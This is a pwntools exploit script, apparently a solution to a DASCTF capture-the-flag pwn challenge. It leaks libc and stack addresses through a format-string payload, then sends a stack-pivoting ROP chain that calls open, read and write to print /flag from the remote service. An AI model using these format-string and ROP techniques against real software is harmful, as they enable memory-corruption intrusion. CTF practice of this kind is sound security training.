from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["tcp.cloud.dasctf.com",29697]
libc=ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)

leave_ret = p64(0x4012e1)
pop_rdi = p64(0x401413)

ru(b'name:\n')
payload = b'%31$p%p'
s(payload)
ru(b'Hello, ')
libc_base = int(rc(14),16) - 0x24083
stack_addr = int(rc(14),16)
pr('libc_base', libc_base)
pr('stack_addr', stack_addr)

pop_rsi = p64(libc_base + 0x2601f)
pop_rdx = p64(libc_base + 0x142c92)

flag_addr = stack_addr + 0xc0 + 0x100
payload = b'/flag\x00\x00\x00' + pop_rdi + p64(stack_addr + 0x10) + pop_rsi + p64(0) + p64(libc_base + libc.sym['open'])
payload += pop_rdi + p64(3) + pop_rsi + p64(flag_addr) + pop_rdx + p64(0x30) + p64(libc_base + libc.sym['read'])
payload += pop_rdi + p64(1) + pop_rsi + p64(flag_addr) + pop_rdx + p64(0x30) + p64(libc_base + libc.sym['write'])

payload = payload.ljust(0xb0,b'\x00')
payload += p64(stack_addr + 0x10) + leave_ret

ru(b'DASCTF:\n')
s(payload)

shell()
